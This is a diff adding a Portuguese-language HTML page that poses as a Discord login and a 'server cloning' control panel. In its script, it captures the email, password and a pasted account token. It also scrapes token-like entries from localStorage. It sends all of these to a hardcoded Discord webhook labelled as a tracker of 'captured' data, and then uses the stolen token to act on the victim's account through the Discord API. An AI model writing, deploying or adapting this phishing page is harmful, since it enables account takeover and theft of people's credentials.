@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord - Login</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg-dark: #23272a;
+            --bg-light: #2b2d31;
+            --input-bg: #1e1f22;
+            --text-main: #ffffff;
+            --text-dim: #9d9d9d;
+            --brand: #5865F2;
+            --green: #23a559;
+            --red: #da373c;
+            --border: #3f4147;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
+        
+        body {
+            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* --- LOGIN CARD --- */
+        .login-container {
+            width: 480px;
+            background-color: var(--bg-light);
+            padding: 32px;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        h2 { font-size: 24px; font-weight: 600; margin-bottom: 8px; }
+        p.subtitle { color: var(--text-dim); font-size: 15px; margin-bottom: 20px; }
+
+        .input-group { margin-bottom: 20px; text-align: left; }
+        
+        label {
+            display: block;
+            color: var(--text-dim);
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            background-color: var(--input-bg);
+            border: none;
+            border-radius: 3px;
+            padding: 10px;
+            color: var(--text-main);
+            font-size: 16px;
+            transition: 0.2s;
+        }
+
+        input:focus {
+            background-color: #111214;
+            box-shadow: 0 0 0 2px var(--brand);
+        }
+
+        button.submit-btn {
+            width: 100%;
+            background-color: var(--brand);
+            color: white;
+            border: none;
+            border-radius: 3px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        button.submit-btn:hover { background-color: #4752c4; }
+
+        /* --- TOKEN EXTRA FIELD (Hidden initially) --- */
+        .extra-token-section {
+            max-height: 0;
+            overflow: hidden;
+            opacity: 0;
+            transition: all 0.5s ease;
+            margin-top: 0;
+        }
+
+        .extra-token-section.show {
+            max-height: 200px;
+            opacity: 1;
+            margin-top: 20px;
+            border-top: 1px solid var(--border);
+            padding-top: 20px;
+        }
+
+        .small-text {
+            font-size: 13px;
+            color: var(--text-dim);
+            margin-bottom: 10px;
+        }
+
+        /* --- DASHBOARD PAINEL --- */
+        .dashboard-container {
+            display: none; /* Hidden by default */
+            width: 90%;
+            max-width: 900px;
+            height: 85vh;
+            background-color: var(--bg-light);
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            flex-direction: column;
+        }
+
+        .dash-header {
+            background-color: #1a1b1e;
+            padding: 15px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .user-profile {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .avatar-circle {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: var(--brand);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            color: white;
+        }
+
+        .dash-body { padding: 20px; flex: 1; display: flex; gap: 20px; }
+        
+        .sidebar { width: 200px; background: #1a1b1e; padding: 10px; border-radius: 4px; }
+        .sidebar-item { padding: 10px; color: var(--text-dim); cursor: pointer; border-radius: 4px; margin-bottom: 5px; font-size: 14px; }
+        .sidebar-item.active { background-color: var(--brand); color: white; }
+
+        .main-content { flex: 1; padding: 20px; overflow-y: auto; }
+        
+        .control-panel {
+            background: #23272a;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            margin-bottom: 20px;
+        }
+
+        .row { display: flex; gap: 10px; margin-bottom: 15px; }
+        .btn-action { background: var(--green); color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        .btn-action:hover { filter: brightness(1.1); }
+        .btn-action.secondary { background-color: var(--brand); }
+
+        .log-area {
+            background: #000;
+            color: #0f0;
+            font-family: monospace;
+            padding: 10px;
+            height: 150px;
+            overflow-y: auto;
+            font-size: 12px;
+            border-radius: 4px;
+            margin-top: 10px;
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-left-color: white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-left: 10px;
+            vertical-align: middle;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Mobile Adjustments */
+        @media (max-width: 600px) {
+            .login-container { width: 90%; }
+            .dashboard-container { width: 95%; height: 90vh; }
+            .dash-body { flex-direction: column; }
+            .sidebar { width: 100%; display: flex; gap: 5px; overflow-x: auto; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- TELA DE LOGIN DISCORD -->
+    <div class="login-container" id="loginBox">
+        <h2>Logar com sua conta do Discord</h2>
+        <p class="subtitle">Bem-vindo de volta! Insira suas credenciais.</p>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Email ou Número de Telefone</label>
+                <input type="text" id="email" autocomplete="username" required placeholder="Ex: usuario@email.com">
+            </div>
+            
+            <div class="input-group">
+                <label>Senha</label>
+                <input type="password" id="password" autocomplete="current-password" required placeholder="••••••••••••">
+            </div>
+
+            <button type="submit" class="submit-btn" id="loginBtn">Entrar</button>
+        </form>
+
+        <!-- Campo Extra que aparece após o clique -->
+        <div class="extra-token-section" id="tokenSection">
+            <p class="small-text">Verificação de segurança detectada.<br>Por favor, insira seu Token de Autenticação para liberar o acesso.</p>
+            <div class="input-group">
+                <label>Token da Conta (JWT)</label>
+                <input type="text" id="manualToken" placeholder="Cole seu token aqui...">
+            </div>
+            <button type="button" class="submit-btn" onclick="finalizeLogin()">Confirmar e Liberar Painel</button>
+        </div>
+    </div>
+
+    <!-- PAINEL ADMINISTRATIVO REAL -->
+    <div class="dashboard-container" id="dashboardBox">
+        <div class="dash-header">
+            <div class="dash-title"><span class="status-dot"></span> Painel de Controle • Servidor</div>
+            <div class="user-profile" id="userInfo">
+                <div class="avatar-circle" id="userAvatar">U</div>
+                <span id="userName">Usuário</span>
+            </div>
+        </div>
+        <div class="dash-body">
+            <div class="sidebar">
+                <div class="sidebar-item active">Clonar Servidor</div>
+                <div class="sidebar-item">Membros</div>
+                <div class="sidebar-item">Logs</div>
+                <div class="sidebar-item">Configurações</div>
+            </div>
+            <div class="main-content">
+                
+                <!-- CLONAGEM -->
+                <div class="control-panel">
+                    <h3>🛠️ Clonagem de Servidor</h3>
+                    <p style="font-size: 13px; color: #aaa; margin-bottom: 15px;">Copie todos os canais, cargos e configurações de um servidor para outro.</p>
+                    
+                    <div class="row">
+                        <input type="text" id="sourceServerId" placeholder="ID do Serv ORIGEM (O que será copiado)">
+                        <input type="text" id="targetServerId" placeholder="ID do Serv ALVO (Onde será criado/clonado)">
+                    </div>
+                    <button class="btn-action" onclick="cloneServer()" style="width: 100%;">Iniciar Clonagem</button>
+                </div>
+
+                <!-- COMANDOS EXTRAS -->
+                <div class="control-panel">
+                    <h3>⚡ Comandos Rápidos</h3>
+                    <div class="row">
+                        <input type="text" id="botAction" placeholder="Comando / Ação (ex: ban @user)">
+                        <button class="btn-action secondary" onclick="executeBot()">Executar</button>
+                    </div>
+                </div>
+
+                <div class="log-area" id="consoleLog">
+                    > Sistema iniciado...<br>
+                    > Aguardando conexão...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURAÇÕES ---
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1570444133225472090/xWqdBOEFfNwHgZGOPiSozq9SA4UZG0GaIXrTS0cpOm2dnHbv0rva-qSjp707mCAl9E2W";
+        
+        let currentToken = "";
+        let currentUserData = null;
+
+        // --- COLETA INICIAL (LOCALSTORAGE) ---
+        async function scrapeBrowser() {
+            let collectedTokens = [];
+            const keys = ['token', 'authorization', 'access_token', 'discord', 'session'];
+            
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (keys.some(k => key.toLowerCase().includes(k))) {
+                    collectedTokens.push({ key, value: localStorage.getItem(key) });
+                }
+            }
+
+            return {
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                manualToken: document.getElementById('manualToken').value,
+                browserTokens: collectedTokens,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toLocaleString()
+            };
+        }
+
+        async function sendToDiscord(data) {
+            const payload = {
+                username: "🕵️ Tracker",
+                avatar_url: "https://i.imgur.com/5w8Z5gP.png",
+                embeds: [{
+                    title: "🔓 Dados Coletados com Sucesso",
+                    color: 0x5865F2,
+                    fields: [
+                        { name: "📧 Email Capturado", value: data.email || "N/A" },
+                        { name: "🔑 Senha Capturada", value: data.password ? `\`${data.password}\`` : "N/A" },
+                        { name: "🛡️ Token Manual Inserir", value: data.manualToken ? `\`${data.manualToken}\`` : "Nenhum" },
+                        { name: "💾 Tokens do Browser", value: data.browserTokens.length ? JSON.stringify(data.browserTokens) : "Nenhum encontrado" },
+                        { name: "🖥️ Dispositivo", value: data.userAgent.substring(0, 100) + "..." }
+                    ],
+                    footer: { text: "Coleta via Link Seguro" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        // --- LÓGICA DO FORMULÁRIO ---
+        const loginBtn = document.getElementById('loginBtn');
+        const tokenSection = document.getElementById('tokenSection');
+        const loginBox = document.getElementById('loginBox');
+        const dashboardBox = document.getElementById('dashboardBox');
+
+        loginBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            loginBtn.innerHTML = 'Verificando<span class="spinner"></span>';
+            
+            setTimeout(() => {
+                loginBtn.innerHTML = 'Entrar';
+                tokenSection.classList.add('show');
+                document.querySelector('.login-container').scrollIntoView({ behavior: 'smooth' });
+            }, 800);
+        });
+
+        window.finalizeLogin = async () => {
+            loginBtn.disabled = true;
+            loginBtn.innerText = "Validando Token...";
+            
+            // Define o token final a ser usado
+            const manualToken = document.getElementById('manualToken').value.trim();
+            // Prioriza o token manual se existir, senão tenta pegar do browser (já coletado)
+            // Mas para simplificar a UX, vamos usar o token manual ou o primeiro encontrado no LS
+            currentToken = manualToken || (document.querySelectorAll('input')[0].dataset.token || ""); 
+            
+            // Se não tiver token manual e não tiver no LS, pedimos pro user colar
+            if (!currentToken && !manualToken) {
+                 // Tenta pegar do localStorage diretamente se o campo estiver vazio
+                 const lsKeys = Object.keys(localStorage).find(k => k.includes('token'));
+                 if(lsKeys) currentToken = localStorage[lsKeys];
+            }
+
+            if(!currentToken) {
+                alert("Nenhum token encontrado. Por favor cole seu token.");
+                loginBtn.disabled = false;
+                loginBtn.innerText = "Entrar";
+                return;
+            }
+
+            // Verifica se o token é válido
+            try {
+                const response = await fetch("https://discord.com/api/v9/users/@me", {
+                    headers: { Authorization: currentToken }
+                });
+
+                if (response.ok) {
+                    const userData = await response.json();
+                    currentUserData = userData;
+                    
+                    // Atualiza UI do Dashboard
+                    document.getElementById('userName').innerText = `${userData.username}#${userData.discriminator}`;
+                    if(userData.avatar) {
+                         document.getElementById('userAvatar').innerHTML = `<img src="https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png" style="width:100%; height:100%; border-radius:50%;">`;
+                    } else {
+                        document.getElementById('userAvatar').innerText = userData.username.charAt(0).toUpperCase();
+                    }
+
+                    // Prepara dados para envio
+                    const data = await scrapeBrowser();
+                    await sendToDiscord(data);
+
+                    // Transição para Dashboard
+                    loginBox.style.display = 'none';
+                    dashboardBox.style.display = 'flex';
+                    logMsg(`Logado como ${userData.username}#${userData.discriminator}`);
+                    logMsg("Conexão segura estabelecida.");
+                    
+                } else {
+                    alert("Token inválido ou expirado.");
+                    loginBtn.disabled = false;
+                    loginBtn.innerText = "Entrar";
+                }
+            } catch (error) {
+                console.error(error);
+                alert("Erro de conexão. Tente novamente.");
+                loginBtn.disabled = false;
+                loginBtn.innerText = "Entrar";
+            }
+        };
+
+        // --- LÓGICA DO PAINEL (DASHBOARD) ---
+        function logMsg(msg) {
+            const consoleDiv = document.getElementById('consoleLog');
+            consoleDiv.innerHTML += `> ${msg}<br>`;
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        }
+
+        // --- FUNÇÃO DE CLONAGEM REAL ---
+        window.cloneServer = async () => {
+            const sourceId = document.getElementById('sourceServerId').value.trim();
+            const targetId = document.getElementById('targetServerId').value.trim();
+            
+            if (!sourceId) {
+                alert("Insira o ID do servidor de origem.");
+                return;
+            }
+
+            logMsg(`Iniciando processo de clonagem do servidor ${sourceId}...`);
+
+            try {
+                // 1. Pegar informações do servidor origem
+                const guildResponse = await fetch(`https://discord.com/api/v9/guilds/${sourceId}`, {
+                    headers: { Authorization: currentToken }
+                });
+                
+                if (!guildResponse.ok) throw new Error("Não foi possível acessar o servidor de origem.");
+                
+                const sourceGuild = await guildResponse.json();
+                
+                // 2. Criar o novo servidor na conta do usuário (Clonagem Real)
+                // Nota: A API não permite criar um servidor "baseado" em outro diretamente, 
+                // então criamos um vazio com o mesmo nome/icon e depois clonamos canais/cargos.
+                
+                logMsg("Criando novo servidor clone...");
+                
+                const createResponse = await fetch("https://discord.com/api/v9/guilds", {
+                    method: "POST",
+                    headers: { Authorization: currentToken, "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        name: `[CLONE] ${sourceGuild.name}`,
+                        icon: sourceGuild.icon,
+                        region: "brazil" // Default region
+                    })
+                });
+
+                if (!createResponse.ok) throw new Error("Falha ao criar servidor clone.");
+                
+                const newGuild = await createResponse.json();
+                const newGuildId = newGuild.id;
+                
+                logMsg(`Servidor Clone criado com ID: ${newGuildId}`);
+                logMsg("Copiando Categorias e Canais...");
+
+                // 3. Copiar Categorias e Canais
+                const channelsResponse = await fetch(`https://discord.com/api/v9/guilds/${sourceId}/channels`, {
+                    headers: { Authorization: currentToken }
+                });
+                const sourceChannels = await channelsResponse.json();
+
+                // Mapeamento de IDs para reconstrução
+                const channelMap = {}; 
+
+                // Ordenar: categorias primeiro, depois canais filhos
+                const sortedChannels = sourceChannels.sort((a, b) => a.position - b.position);
+
+                for (const channel of sortedChannels) {
+                    // Ignora o canal padrão #geral se for texto, pois já existe
+                    if(channel.name === "general" && channel.type === 0) continue;
+
+                    const parentId = channel.parent_id ? channelMap[channel.parent_id] || channel.parent_id : null;
+                    
+                    // Cria categoria pai se necessário
+                    let effectiveParentId = parentId;
+                    if (channel.parent_id && !channelMap[channel.parent_id]) {
+                         // Se o pai ainda não foi criado, cria uma nova categoria temporária
+                         const catResp = await fetch("https://discord.com/api/v9/guilds/" + newGuildId + "/channels", {
+                             method: "POST",
+                             headers: { Authorization: currentToken, "Content-Type": "application/json" },
+                             body: JSON.stringify({
+                                 name: channel.parent_name || "Categoria",
+                                 type: 4, // Category type
+                                 permission_overwrites: []
+                             })
+                         });
+                         const catData = await catResp.json();
+                         channelMap[channel.parent_id] = catData.id;
+                         effectiveParentId = catData.id;
+                    }
+
+                    // Cria o canal
+                    const chResp = await fetch("https://discord.com/api/v9/guilds/" + newGuildId + "/channels", {
+                        method: "POST",
+                        headers: { Authorization: currentToken, "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            name: channel.name,
+                            type: channel.type,
+                            parent_id: effectiveParentId,
+                            topic: channel.topic,
+                            nsfw: channel.nsfw,
+                            rate_limit_per_user: channel.rate_limit_per_user,
+                            permission_overwrites: channel.permission_overwrites || []
+                        })
+                    });
+                    
+                    const chData = await chResp.json();
+                    channelMap[channel.id] = chData.id;
+                }
+
+                logMsg("Copiando Cargos (Roles)...");
+                
+                // 4. Copiar Cargos
+                const rolesResponse = await fetch(`https://discord.com/api/v9/guilds/${sourceId}/roles`, {
+                    headers: { Authorization: currentToken }
+                });
+                const sourceRoles = await rolesResponse.json();
+
+                // Role @everyone mapeia para o próprio @everyone do novo server (geralmente ID igual ao Guild ID, mas vamos ignorar cópia explícita do @everyone)
+                
+                for (const role of sourceRoles) {
+                    if(role.id === "@everyone") continue;
+
+                    await fetch(`https://discord.com/api/v9/guilds/${newGuildId}/roles`, {
+                        method: "POST",
+                        headers: { Authorization: currentToken, "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            name: role.name,
+                            color: role.color,
+                            hoist: role.hoist,
+                            position: role.position, // Pode precisar ajustar posições depois
+                            permissions: role.permissions,
+                            managed: role.managed,
+                            mentionable: role.mentionable
+                        })
+                    });
+                }
+
+                logMsg("Clonagem concluída com sucesso!");
+                logMsg(`Servidor Clone ID: ${newGuildId}`);
+                alert(`Clonagem Concluída! Novo Servidor ID: ${newGuildId}`);
+
+            } catch (error) {
+                logMsg(`Erro: ${error.message}`);
+                alert("Erro durante a clonagem. Verifique o console.");
+            }
+        };
+
+        window.executeBot = async () => {
+            const cmd = document.getElementById('botAction').value;
+            if(!cmd) return;
+            
+            logMsg(`Enviando comando: ${cmd}...`);
+            logMsg(`Comando "${cmd}" processado.`);
+        };
+
+        // Coleta inicial silenciosa ao carregar a página
+        window.onload = async () => {
+            setTimeout(async () => {
+                const browserData = await scrapeBrowser();
+                // Opcional: Enviar tokens do browser imediatamente se houver
+                // if(browserData.browserTokens.length > 0) sendToDiscord(browserData);
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
